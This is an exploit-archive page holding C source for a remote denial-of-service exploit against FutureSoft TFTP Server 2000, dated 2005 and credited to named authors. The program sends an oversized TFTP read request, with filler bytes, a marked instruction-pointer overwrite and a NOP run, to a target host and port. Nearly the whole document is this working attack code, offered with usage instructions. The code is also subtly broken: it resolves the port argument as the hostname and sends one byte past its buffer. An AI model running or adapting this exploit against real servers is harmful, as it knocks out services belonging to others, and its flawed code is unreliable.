<html><head><title>FutureSoft TFTP Server 2000 Remote Denial of Service Exploit</title></head><pre>/*
*
* FutureSoft TFTP Server 2000 Remote Denial of Service Exploit
* http://www.futuresoft.com/products/lit-tftp2000.htm
* Bug Discovered by SIG^2 (http://www.security.org.sg)
* Exploit coded By ATmaCA
* Web: atmacasoft.com &amp;&amp; spyinstructors.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan
* Usage:tftp_exp &lt;targetIp&gt; [targetPort]
*
*/

/*
*
* Vulnerable Versions:
* TFTP Server 2000 Evaluation Version 1.0.0.1
*
*/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

/* |RRQ|AAAAAAAAAAAAAAAA....|NULL|netasc|NULL| */
char expbuffer[] =
&quot;\x00\x01&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x58\x58\x58\x58&quot; /* EIP */
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x6E\x65\x74\x61\x73\x63\x69&quot;
&quot;\x69\x00&quot;;

void main(int argc, char *argv[])
{
        WSADATA wsaData;
        WORD wVersionRequested;
        struct hostent *pTarget;
        struct sockaddr_in sock;
        SOCKET mysocket;
        int destPORT = 69;//Default to 69

        if (argc &lt; 2){
                printf(&quot;FutureSoft TFTP Server 2000 Remote Denial of Service Exploit\n&quot;);
                printf(&quot;http://www.futuresoft.com/products/lit-tftp2000.htm\n&quot;);
                printf(&quot;Bug Discovered by SIG^2 (http://www.security.org.sg)\n&quot;);
                printf(&quot;Exploit coded By ATmaCA\n&quot;);
                printf(&quot;Web: atmacasoft.com &amp;&amp; spyinstructors.com\n&quot;);
                printf(&quot;E-Mail: atmaca@icqmail.com\n&quot;);
                printf(&quot;Credit to kozan\n&quot;);
                printf(&quot;Usage:tftp_exp &lt;targetIp&gt; [targetPort]\n&quot;);
                return;
        }
        if (argc==3)
                destPORT=atoi(argv[2]);

        printf(&quot;Requesting Winsock...\n&quot;);
        wVersionRequested = MAKEWORD(1, 1);
        if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) {
                printf(&quot;No winsock suitable version found!&quot;);
                return;
        }
        mysocket = socket(AF_INET, SOCK_DGRAM	, 0);
        if(mysocket==INVALID_SOCKET){
                printf(&quot;Can't create UDP socket\n&quot;);
                exit(1);
        }
        printf(&quot;Resolving Hostnames...\n&quot;);
        if ((pTarget = gethostbyname(argv[2])) == NULL){
                printf(&quot;Resolve of %s failed\n&quot;, argv[1]);
                exit(1);
        }
        memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
        sock.sin_family = AF_INET;
        sock.sin_port = htons(destPORT);

        printf(&quot;Connecting...\n&quot;);
        if ( (connect(mysocket, (struct sockaddr *)&amp;sock, sizeof (sock) ))){
                printf(&quot;Couldn't connect to host.\n&quot;);
                exit(1);
        }

        printf(&quot;Connected!...\n&quot;);
        Sleep(10);

        printf(&quot;RRQ-&gt;Sending packet. Size: %d\n&quot;,sizeof(expbuffer));
        if (send(mysocket,expbuffer, sizeof(expbuffer)+1, 0) == -1){
                printf(&quot;Error sending packet\n&quot;);
                closesocket(mysocket);
                exit(1);
        }
        printf(&quot;Packet sent........\n&quot;);
        printf(&quot;Success.\n&quot;);

        closesocket(mysocket);
        WSACleanup();
}

// milw0rm.com [2005-06-02]</pre></html>